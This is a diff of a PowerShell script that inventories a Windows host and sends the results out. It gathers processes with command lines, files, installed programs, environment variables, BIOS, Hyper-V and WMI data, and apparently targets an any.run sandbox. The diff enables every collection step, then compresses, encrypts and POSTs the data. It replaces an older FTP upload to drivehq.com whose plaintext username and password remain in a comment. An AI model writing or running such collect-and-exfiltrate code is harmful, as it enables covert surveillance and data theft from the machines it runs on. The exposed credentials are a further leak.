@@ -102,7 +102,7 @@ function Get_Hyper_V() {
 	return $output
 }
 
-function Get-Info() {
+function Get_Info() {
     Param(
         [Parameter(
             Mandatory = $true,
@@ -113,12 +113,13 @@ function Get-Info() {
     )
 
     #region Inventory Classes
-    $json = " { "
-    $json += " `"Token`": `"" + $Token + "`","
-    $json += " `"SnapshotDate`": `"" + $(Get-Date -format u) + "`""
+    $output = " { "
+    $output += " `"Token`": `"" + $Token + "`","
+    $output += " `"SnapshotDate`": `"" + $(Get-Date -format u) + "`","
+	#$output += " `"PublicIPv4`": `"" + $(Get_Public_IP) + "`""
 
-	$json += '}'
-	return $json
+	$output += '}'
+	return $output
 }
 
 function Get_Installed_Programs_Registry(){
@@ -150,6 +151,10 @@ function Get_Procs() {
 	$output = '{"Running Processes":'
 	$output += '['
 
+	<#
+		Cannot use Get-Process cmdlet as it only retrieves certain processes
+		ex: 64-bit powershell will miss 32-bit processes on a 64-bit machine
+	#>
 	$props = @("Caption", "Description", "Name", "ProcessName", "CommandLine", "ExecutablePath", "Path")
 	$class = "Win32_Process"
 	$output += WMI_Query $class $props
@@ -158,6 +163,19 @@ function Get_Procs() {
 	$output += '}'
 
 	return $output
+}
+
+function Get_Public_IP() {
+    $WebRequest = [System.Net.WebRequest]::Create("https://api.ipify.org?format=text")
+    $WebRequest.Method = "GET"
+    $Response = $WebRequest.GetResponse()
+    $ResponseStream = $Response.GetResponseStream()
+    $ReadStream = New-Object System.IO.StreamReader $ResponseStream
+    $Data = $ReadStream.ReadToEnd()
+    $obj = New-Object psobject
+    Add-Member -InputObject $obj -MemberType NoteProperty -Name ipv4 -Value $Data
+
+    return $obj.ipv4
 }
 
 function Get_Wallpaper() {
@@ -302,7 +320,7 @@ function Get_WMI_Data() {
 	$output += WMI_Query $class $props
 
 	$output += ','
-	$props = @("BootDevice", "Caption", "Version", "CSName", "CountryCode", "CurrentTimeZone", "Name")
+	$props = @("BootDevice", "Caption", "Version", "CSName", "CountryCode", "CurrentTimeZone", "Name", "LastBootUpTime", "LocalDateTime", "Locale")
 	$class = "Win32_OperatingSystem"
 	$output += WMI_Query $class $props
 
@@ -311,13 +329,12 @@ function Get_WMI_Data() {
 	$class = "Win32_PhysicalMemory"
 	$output += WMI_Query $class $props
 
-	<# TOO SLOW?  #>
-<#
+	<#	THIS IS TOO SLOW
 	$output += ','
 	$props = @("__RELPATH", "InstallDate")
 	$class = "Win32_Product"
 	$output += WMI_Query $class $props
-#>
+	#>
 
 	$output += ','
 	$props = @("DisplayName", "Description", "PathName", "State", "StartMode", "StartName")
@@ -483,6 +500,8 @@ function Zdcom() {
 
 function Zend() {
 	Param ($str)
+
+	<#
 	$username = 'crazyrockinsushi'
 	$password = '$5OffToday' # $5Off
 	$server = "ftp://ftp.drivehq.com/"
@@ -504,6 +523,24 @@ function Zend() {
 	$rs.Dispose()
 
 	Remove-Item $file
+	#>
+
+	$url = "http://localhost/pocky/index.php?"
+	$request = [System.Net.WebRequest]::Create($url)
+	$request.Method = "POST"
+	$request.ContentType = "text/plain"
+	$body = [byte[]][char[]]$str
+	$request.Timeout = 10000
+	$stream = $request.GetRequestStream()
+	$stream.Write($body, 0, $body.Length)
+	$stream.Flush()
+	$stream.Close()
+
+	$response = $request.GetResponse().GetResponseStream()
+	$streamResponse = New-Object System.IO.StreamReader($response)
+	$data = $streamResponse.ReadToEnd()
+
+	Write-Host $data.ToString()
 }
 
 # supress noisy errors
@@ -511,8 +548,8 @@ $ErrorActionPreference = 'stop'
 
 # manually build the JSON output string
 $out = '['
-$out += Get-Info -Token "Win7_32bit_anyrun"
-<#
+$out += Get_Info -Token "Win7_32bit_anyrun"
+$out += ','
 $out += Get_Hyper_V
 $out += ','
 $out += Get_Environment_Variables
@@ -520,24 +557,19 @@ $out += ','
 $out += Get_Wallpaper
 $out += ','
 $out += Get_BIOS_Registry
-#>
 $out += ','
 $out += Get_WMI_Data	#to be continued  finished CIMV2
-<#
 $out += ','
 $out += Get_Procs
 $out += ','
 $out += Get_Files
 $out += ','
 $out += Get_Installed_Programs_Registry
-#>
 $out += ']'
 $out = $out -replace '\\', '\\'
 
-<#
+#Write-Host $out
+
 $out = Zcompress $out
 $out = Zencrypt $out
 Zend $out
-#>
-
-Write-Host $out
